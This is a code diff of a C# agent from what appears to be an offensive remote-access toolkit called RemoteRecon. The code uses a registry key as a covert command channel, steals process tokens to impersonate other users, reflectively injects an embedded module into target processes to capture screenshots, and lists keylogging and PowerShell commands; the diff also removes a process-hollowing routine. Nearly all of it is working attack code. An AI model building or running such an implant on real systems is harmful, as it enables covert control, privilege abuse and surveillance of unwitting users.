@@ -1,5 +1,6 @@
 ﻿using System;
 using System.Text;
+using System.Reflection;
 using Microsoft.Win32;
 using System.Security.Principal;
 using System.Security;
@@ -11,15 +12,13 @@ using System.Runtime.Remoting.Channels.Ipc;
 using System.Runtime.Remoting.Channels;
 using System.Diagnostics;
 using RemoteReconKS;
+using ReflectiveInjector;
+using System.Collections.Generic;
 
 namespace RemoteReconCore
 {
     public class Agent
     {
-        //static vars 
-        public static int sleep = 5;
-        public static WindowsImpersonationContext context = null;
-        public static string exceptionInfo;
         public Agent()
         {
 
@@ -27,52 +26,51 @@ namespace RemoteReconCore
 
         public void Run(string basepath, string runkey, string commandkey, string argumentkey, string resultkey, string keylogkey, string screenshotkey)
         {
+            //open base key
             RegistryKey hklm = Registry.LocalMachine;
-            RegistryKey RemoteReconBase;
 
-            //Open the base registry path for RemoteRecon C2
-            try
+            //Get the recon module from the embedded resource
+            mod = GetReconModule();
+#if DEBUG
+            Console.WriteLine("Opening Remote Recon base key");
+#endif
+            if ((rrbase = hklm.OpenSubKey(basepath, RegistryKeyPermissionCheck.ReadWriteSubTree)) == null)
+                System.Environment.Exit(0); /*Exit because we couldn't open the basekey*/
+
+            while (rrbase.GetValue(runkey) != null)
             {
-                RemoteReconBase = hklm.OpenSubKey(basepath, RegistryKeyPermissionCheck.ReadWriteSubTree);
-            }
-            catch (Exception)
-            {
-                //If we cant open the DarkRecon subkey, set to null so we cleanly exit
-                RemoteReconBase = null;
-            }
+                //main loop
+                int cmd;
+                if ((cmd = (int)rrbase.GetValue(commandkey)) == 0)
+                    continue; /*Continue if no cmd*/
 
-            //Main loop
+                command = new KeyValuePair<int, object>(cmd, rrbase.GetValue(argumentkey));
+                Exec();
 
-            while ((RemoteReconBase != null) && (RemoteReconBase.GetValue(runkey) != null))
-            {
-                string result = "";
-                string command = (string)RemoteReconBase.GetValue(commandkey);
-
-                switch (command)
+                //Post results to the appropriate key
+                switch (command.Key)
                 {
-                    case "impersonate":
-                        //Obtain the pid from the arg key
-                        string pid = (string)RemoteReconBase.GetValue(argumentkey);
-                        RemoteReconBase.SetValue(argumentkey, "");
-                        RemoteReconBase.SetValue(commandkey, "");
-                        if (pid != null)
-                        {
-                            int ipid = Convert.ToInt32(pid);
-                            context = impersonate(ipid);
-                            result = "impersonated: " + WindowsIdentity.GetCurrent().Name;
-
-                            if (context == null)
-                            {
-                                result = "impersonation failed";
-                            }
-                            //Write the result to the registry for retrieval
-                            RemoteReconBase.SetValue(resultkey, Convert.ToBase64String(Encoding.ASCII.GetBytes(result)));
-                            break;
-                        }
-                        result = "missing command argument";
-                        RemoteReconBase.SetValue(resultkey, Convert.ToBase64String(Encoding.ASCII.GetBytes(result)));
+                    case (int)Cmd.Impersonate:
+#if DEBUG
+                        Console.WriteLine("Writing Impersonate command Result");
+#endif
+                        rrbase.SetValue(resultkey, result.Key, RegistryValueKind.DWord);
+                        rrbase.SetValue(runkey, Convert.ToBase64String(Encoding.ASCII.GetBytes((string)result.Value)), RegistryValueKind.String);
+                        rrbase.SetValue(commandkey, 0);
+                        rrbase.SetValue(argumentkey, "");
+                        command = new KeyValuePair<int, object>(0, "");
                         break;
-
+                    case (int)Cmd.Screenshot:
+#if DEBUG
+                        Console.WriteLine("Writing Screenshot command Result");
+#endif
+                        rrbase.SetValue(resultkey, result.Key, RegistryValueKind.DWord);
+                        if (result.Key == 0) rrbase.SetValue(screenshotkey, result.Value, RegistryValueKind.String);
+                        else rrbase.SetValue(runkey, result.Value, RegistryValueKind.String);
+                        rrbase.SetValue(commandkey, 0);
+                        rrbase.SetValue(argumentkey, "");
+                        command = new KeyValuePair<int, object>(0, "");
+                        break;
                     default:
                         break;
                 }
@@ -81,122 +79,118 @@ namespace RemoteReconCore
             }
         }
 
-        public static WindowsImpersonationContext impersonate(int pid)
+        private void Exec()
+        {
+            //Check the command keyvalue pair for a new command.
+            if ((int)Cmd.Impersonate == command.Key)
+            {
+#if DEBUG
+                Console.WriteLine("Received Impersonate command");
+#endif
+                impersonate(Convert.ToInt32(command.Value));
+            }
+            else if ((int)Cmd.Screenshot == command.Key)
+            {
+#if DEBUG 
+                Console.WriteLine("Received Screenshot command");
+#endif
+                GetScreenShot((int)command.Value);
+            }
+        }
+
+        private static int sleep = 5;
+        private static WindowsImpersonationContext context = null;
+        //private string exceptionInfo;
+        private byte[] mod;
+        public static KeyValuePair<int, object> command;
+        public static KeyValuePair<int, object> result;
+        RegistryKey rrbase;
+        public enum Result : int
+        {
+            Success = 0,
+            InjectFailed = 1,
+            ScreenShotFailed = 2,
+            KeylogFailed = 3,
+            ImpersonateFailed = 4,
+            PSFailed = 5
+        }
+
+        public enum Cmd : int
+        {
+            Impersonate = 1,
+            Keylog = 2,
+            Screenshot = 3,
+            PowerShell = 4,
+            Revert = 5
+        }
+        private void impersonate(int pid)
         {
             IntPtr hProcHandle = IntPtr.Zero;
             IntPtr hProcToken = IntPtr.Zero;
 
-            WindowsImpersonationContext ctx = null;
+            if ((hProcHandle = WinApi.OpenProcess(WinApi.PROCESS_ALL_ACCESS, true, pid)) == IntPtr.Zero)
+                if ((hProcHandle = WinApi.OpenProcess(WinApi.PROCESS_QUERY_INFORMATION, true, pid)) == IntPtr.Zero)
+                    WinApi.CloseHandle(hProcHandle);
 
-            hProcHandle = WinApi.OpenProcess(WinApi.PROCESS_ALL_ACCESS, true, pid);
-
-            if (hProcHandle == IntPtr.Zero)
-            {
-                hProcHandle = WinApi.OpenProcess(WinApi.PROCESS_QUERY_INFORMATION, true, pid);
-                if (hProcHandle == IntPtr.Zero)
-                {
-                    return ctx;
-                }
-            }
-
-            bool success = WinApi.OpenProcessToken(hProcHandle, WinApi.TOKEN_ALL_ACCESS, out hProcToken);
-
-            if (!success)
-            {
-                return ctx;
-            }
+            if (!WinApi.OpenProcessToken(hProcHandle, WinApi.TOKEN_ALL_ACCESS, out hProcToken))
+                WinApi.CloseHandle(hProcHandle);
 
             WindowsIdentity newId = new WindowsIdentity(hProcToken);
 
             try
-            {
-                ctx = newId.Impersonate();
+            { 
+                context = newId.Impersonate();
+                result = new KeyValuePair<int, object>(0, "Impersonated: " + newId.Name);
             }
-            catch (Exception)
+            catch (Exception e)
             {
-                return null;
+                result = new KeyValuePair<int, object>(4, e.ToString());
             }
-
-            return ctx;
         }
 
-        public static bool hollowProcess(string path, int pid, byte[] pebytes)
+        private void GetScreenShot(int pid)
         {
-            IntPtr ProcHandle = IntPtr.Zero;
-            IntPtr hTokenhandle = IntPtr.Zero;
-
-           
-            if (!File.Exists(path))
+            string image = "";
+            //Function for connecting to the remoting server and obtaining the screenshot
+            //Inject the recon module into the target process.
+            Injector screenshot = new Injector(pid, mod);
+            if (!screenshot.Inject())
+                result = new KeyValuePair<int, object>(2, "Recon module injection failed.");
+            else
             {
-                return false;
+                //Connect to the remote module via IPC
+                ChannelServices.RegisterChannel(new IpcChannel(), false);
+                WellKnownClientTypeEntry rrScreenShot = new WellKnownClientTypeEntry(typeof(RemoteRecon), "ipc://rr_ks/");
+                RemotingConfiguration.RegisterWellKnownClientType(rrScreenShot);
+
+                //Take a screenshot
+                RemoteRecon runner = new RemoteRecon();
+                if ((image = runner.screenshot()) == "")
+                    result = new KeyValuePair<int, object>(2, "screenshot failed");
+                else
+                    result = new KeyValuePair<int, object>(0, image);
+
+                runner.exit();
+            }
+        }
+
+        private byte[] GetReconModule()
+        {
+            string resourceName = "";
+            string bytestring = "";
+            if (IntPtr.Size == 8)
+                resourceName = "RemoteReconCore.RemoteReconHostx64.txt";
+            else
+                resourceName = "RemoteReconCore.RemoteReconHostx86.txt";
+
+            var assembly = Assembly.GetExecutingAssembly();
+            using (Stream stream = assembly.GetManifestResourceStream(resourceName))
+            using (StreamReader reader = new StreamReader(stream))
+            {
+                bytestring = reader.ReadToEnd();
             }
 
-            PEloader pe = new PEloader(pebytes);
-
-            //Steal the token from the target process
-            ProcHandle = WinApi.OpenProcess(WinApi.PROCESS_ALL_ACCESS, true, pid);
-            if (ProcHandle == IntPtr.Zero)
-            {
-                ProcHandle = WinApi.OpenProcess(WinApi.PROCESS_QUERY_INFORMATION, true, pid);
-                if (ProcHandle == IntPtr.Zero)
-                {
-                    return false;
-                }
-            }
-
-            bool success = WinApi.OpenProcessToken(ProcHandle, WinApi.TOKEN_ALL_ACCESS, out hTokenhandle);
-            if (!success)
-            {
-                return false;
-            }
-
-            //Create the suspended process
-            WinApi.STARTUPINFO sinfo = new WinApi.STARTUPINFO();
-            WinApi.PROCESS_INFORMATION pi = new WinApi.PROCESS_INFORMATION();
-            WinApi.SECURITY_ATTRIBUTES processattributes = new WinApi.SECURITY_ATTRIBUTES();
-            WinApi.SECURITY_ATTRIBUTES threadattributes = new WinApi.SECURITY_ATTRIBUTES();
-            success = WinApi.CreateProcessAsUser(hTokenhandle, path, null, ref processattributes, ref threadattributes, false, ((uint)WinApi.ProcessCreationFlags.CREATE_NO_WINDOW | (uint)WinApi.ProcessCreationFlags.CREATE_SUSPENDED), IntPtr.Zero, null, ref sinfo, out pi);
-
-            if (!success)
-            {
-                WinApi.CloseHandle(ProcHandle);
-                WinApi.CloseHandle(hTokenhandle);
-                return false;
-            }
-
-            //Process has been created in a suspended state. 
-            Process targetProc = Process.GetProcessById(pi.dwProcessId);
-            ProcessModule main = targetProc.MainModule;
-            IntPtr tBaseAddress = main.BaseAddress;
-
-
-            if (tBaseAddress == (IntPtr)pe.OptionalHeader64.ImageBase)
-            {
-                WinApi.NtUnmapViewOfSection(pi.hProcess, tBaseAddress);
-            }
-
-            //Allocate mem in the new process
-            IntPtr address = WinApi.VirtualAllocEx(pi.hProcess, tBaseAddress, pe.OptionalHeader64.SizeOfImage, (WinApi.AllocationType.Commit | WinApi.AllocationType.Reserve), WinApi.MemoryProtection.ExecuteReadWrite);
-            if (address == IntPtr.Zero)
-            {
-                targetProc.Kill();
-                return false;
-            }
-
-            IntPtr imagePtr = Marshal.AllocHGlobal(pe.RawBytes.Length);
-            Marshal.Copy(pe.RawBytes, 0, imagePtr, pe.RawBytes.Length);
-
-            //WinApi.NtWriteVirtualMemory(pi.hProcess, address, imagePtr, pe.OptionalHeader64.SizeOfHeaders, IntPtr.Zero);
-
-            for (int i = 0; i < pe.FileHeader.NumberOfSections; i++)
-            {
-                //subtee code but v2.0 compatible way
-                IntPtr destAddress = new IntPtr(address.ToInt64() + (int)pe.ImageSectionHeaders[i].VirtualAddress);
-                IntPtr y = WinApi.VirtualAllocEx(pi.hProcess, destAddress, pe.ImageSectionHeaders[i].SizeOfRawData, (WinApi.AllocationType.Commit | WinApi.AllocationType.Reserve), WinApi.MemoryProtection.ExecuteReadWrite);
-
-                WinApi.NtWriteVirtualMemory(pi.hProcess, y, new IntPtr(imagePtr.ToInt64() + (int)pe.ImageSectionHeaders[i].VirtualAddress), pe.ImageSectionHeaders[i].SizeOfRawData, IntPtr.Zero);
-            }
-            return true;
+            return Convert.FromBase64String(bytestring);
         }
     }
 }
